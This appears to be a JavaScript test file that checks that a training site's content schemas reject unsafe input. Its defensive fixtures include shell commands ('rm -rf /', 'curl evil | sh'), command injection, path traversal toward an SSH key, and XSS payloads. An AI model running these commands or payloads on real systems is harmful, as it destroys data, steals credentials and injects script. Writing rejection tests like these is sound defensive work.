// The content contract must be internally consistent, fit today's content, and reject unsafe input.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import Ajv2020 from 'ajv/dist/2020.js';
import addFormats from 'ajv-formats';
import YAML from 'yaml';
import { catalog, schemaIds, schemas, usableTags, dataSchemaFor } from '../src/index.js';
import common from '../schemas/common.schema.json' with { type: 'json' };

const ROOT = path.resolve(fileURLToPath(new URL('../../..', import.meta.url)));
const CONTENT = path.join(ROOT, 'content');

// Strict mode stays on, except strictRequired: conditional `required` lists (if/then, oneOf)
// name properties declared in the enclosing schema, which is valid JSON Schema.
const ajv = new Ajv2020({ strict: true, strictRequired: false, allErrors: true });
addFormats(ajv);
for (const schema of schemas) ajv.addSchema(schema);
const check = (id, value) => {
  const validate = ajv.getSchema(id);
  assert.ok(validate, `schema ${id} is registered`);
  return validate(value) ? [] : validate.errors.map((e) => `${e.instancePath} ${e.message}`);
};
const valid = (id, value, label) => assert.deepEqual(check(id, value), [], label);
const invalid = (id, value, label) => assert.notDeepEqual(check(id, value), [], `${label} should be rejected`);

const fixture = (name) => JSON.parse(fs.readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8'));

// ---------- Internal consistency ----------

test('every schema compiles in strict mode and has a unique $id', () => {
  const ids = schemas.map((s) => s.$id);
  assert.equal(new Set(ids).size, ids.length);
  for (const schema of schemas) assert.ok(ajv.getSchema(schema.$id), schema.$id);
});

test('the catalog matches its meta-schema and every reference resolves', () => {
  valid(schemaIds.catalog, catalog, 'catalog');
  const names = new Set(Object.keys(catalog.components));
  for (const [name, c] of Object.entries(catalog.components)) {
    for (const r of c.required ?? []) assert.ok(c.attributes[r], `${name}: required attribute ${r} is declared`);
    for (const child of c.allowedChildren ?? []) assert.ok(names.has(child), `${name}: child ${child} exists`);
    for (const parent of c.parents ?? []) assert.ok(parent === 'page' || names.has(parent), `${name}: parent ${parent} exists`);
    for (const [attr, spec] of Object.entries(c.attributes)) {
      if (spec.format) assert.ok(common.$defs[spec.format], `${name}.${attr}: format ${spec.format} exists in common`);
      if (spec.default !== undefined && spec.enum) assert.ok(spec.enum.includes(spec.default), `${name}.${attr}: default is allowed`);
    }
    if (c.data) {
      assert.ok(c.attributes.ref, `${name}: a tag with data has a ref attribute`);
      assert.ok(ajv.getSchema(dataSchemaFor(name)), `${name}: data schema ${c.data} is registered`);
    }
    if (c.replacedBy) assert.ok(names.has(c.replacedBy), `${name}: replacement ${c.replacedBy} exists`);
  }
});

// ---------- Fits today's content ----------

function pageFiles(dir) {
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => {
    const p = path.join(dir, e.name);
    return e.isDirectory() ? pageFiles(p) : p.endsWith('.md') ? [p] : [];
  });
}
const pages = pageFiles(CONTENT).map((file) => ({ file: path.relative(ROOT, file) }));

test('content holds no code, markup or style files', () => {
  (function scan(dir) {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      const p = path.join(dir, e.name);
      if (e.isDirectory()) scan(p);
      // Starter files and trees of lab exercises are the learner's own project files; they are published inert, as *.lab.
      else if (!/[\\/]lab[\\/][^\\/]+[\\/](starter|trees)[\\/]/.test(p))
        assert.doesNotMatch(e.name, /\.(mdx|jsx?|tsx?|mjs|css|html?)$/, `${path.relative(ROOT, p)} is not data`);
    }
  })(CONTENT);
});

const PROGRAM = path.join(CONTENT, 'programs', 'rhel9-ansible');

test('the site, program, chapter and objective files fit their schemas', () => {
  valid(schemaIds.site, YAML.parse(fs.readFileSync(path.join(CONTENT, 'site.yml'), 'utf8')), 'site.yml');
  valid(schemaIds.program, YAML.parse(fs.readFileSync(path.join(PROGRAM, 'program.yml'), 'utf8')), 'program.yml');
  const chapters = fs.readdirSync(path.join(PROGRAM, 'chapters')).filter((d) => /^ch\d{2}-/.test(d));
  assert.ok(chapters.length >= 12);
  for (const dir of chapters)
    valid(schemaIds.chapter, YAML.parse(fs.readFileSync(path.join(PROGRAM, 'chapters', dir, '_chapter.yml'), 'utf8')), dir);
  valid(schemaIds.objectives, YAML.parse(fs.readFileSync(path.join(PROGRAM, 'objectives.yml'), 'utf8')), 'objectives.yml');
});

test('every section frontmatter fits the section schema', () => {
  for (const { file } of pages.filter((p) => /\/ch\d{2}-/.test(p.file))) {
    const front = fs.readFileSync(path.join(ROOT, file), 'utf8').match(/^---\r?\n([\s\S]*?)\r?\n---/);
    valid(schemaIds.section, YAML.parse(front[1]), file);
  }
});

// ---------- Source fixtures ----------

test('a complete program, site and lab definition are accepted', () => {
  valid(schemaIds.program, fixture('program.valid.json'), 'program');
  valid(schemaIds.site, fixture('site.valid.json'), 'site');
  valid(schemaIds.lab, fixture('lab.valid.json'), 'lab');
});

test('unsafe or malformed source values are rejected', () => {
  const program = fixture('program.valid.json');
  invalid(schemaIds.program, { ...program, id: 'Bad Id' }, 'an id with spaces');
  invalid(schemaIds.program, { ...program, theme: { accent: 'red; background: url(evil)' } }, 'CSS in a colour token');
  invalid(schemaIds.program, { ...program, extra: true }, 'an unknown property');
  invalid(schemaIds.program, { ...program, readerVariables: [{ key: 'lower', label: 'x' }] }, 'a lower-case variable key');
  const site = fixture('site.valid.json');
  invalid(schemaIds.site, { ...site, repo: 'javascript:alert(1)' }, 'a javascript: link');
  invalid(schemaIds.site, { ...site, links: [{ title: 'x', items: [{ label: 'x', url: 'data:text/html,<script>' }] }] }, 'a data: link');
  invalid(schemaIds.site, { ...site, legal: '<img src=x onerror=alert(1)>' }, 'raw HTML in inline Markdown');
});

test('lab definitions accept values only, never commands', () => {
  const lab = fixture('lab.valid.json');
  const withCheck = (c) => ({ ...lab, checkpoints: { final: { checks: [c] } } });
  const base = { id: 'x', on: 'webservers', message: 'm' };
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'shell', command: 'rm -rf /' }), 'an arbitrary command check');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'service', names: ['httpd; reboot'] }), 'a unit name with shell syntax');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'file', paths: ['/etc/../../root/x'] }), 'path traversal');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'file', paths: ['/tmp/$(id)'] }), 'command substitution in a path');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'http', url: 'http://evil.example.org/' }), 'an outside URL');
  invalid(
    schemaIds.lab,
    withCheck({ ...base, kind: 'lint', on: 'control', tool: 'ansible-lint', image: 'evil.example/img:latest', files: ['site.yml'] }),
    'an unlisted registry',
  );
  invalid(schemaIds.lab, { ...lab, setup: [{ action: 'run', script: 'curl evil | sh' }] }, 'an arbitrary setup action');
  invalid(schemaIds.lab, { ...lab, starter: ['../../.ssh/id_rsa'] }, 'a starter file outside the project');
});

// ---------- Bundle fixtures ----------

test('a compiled page tree is accepted', () => {
  valid(schemaIds.bundle.page, fixture('page.valid.json'), 'page');
});

test('a compiled page cannot carry markup, script or event handlers', () => {
  const page = fixture('page.valid.json');
  const withNode = (node) => ({ ...page, tree: [node] });
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'script', c: [{ t: 'text', v: 'alert(1)' }] }), 'a script element');
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'a', attrs: { href: 'javascript:alert(1)' } }), 'a javascript: link');
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'p', attrs: { onclick: 'alert(1)' } }), 'an event handler');
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'p', attrs: { style: 'position:fixed' } }), 'an inline style');
  invalid(schemaIds.bundle.page, withNode({ t: 'html', v: '<b>x</b>' }), 'a raw HTML node');
  invalid(schemaIds.bundle.page, withNode({ t: 'tag', name: 'Callout' }), 'a component name that is not a tag');
  invalid(schemaIds.bundle.page, withNode({ t: 'tag', name: 'callout', attrs: { title: { nested: true } } }), 'an object attribute');
  invalid(
    schemaIds.bundle.page,
    withNode({ t: 'code', lang: 'yaml', lines: [[{ v: 'x', l: 'red;x:y' }]] }),
    'a CSS value in a token colour',
  );
});
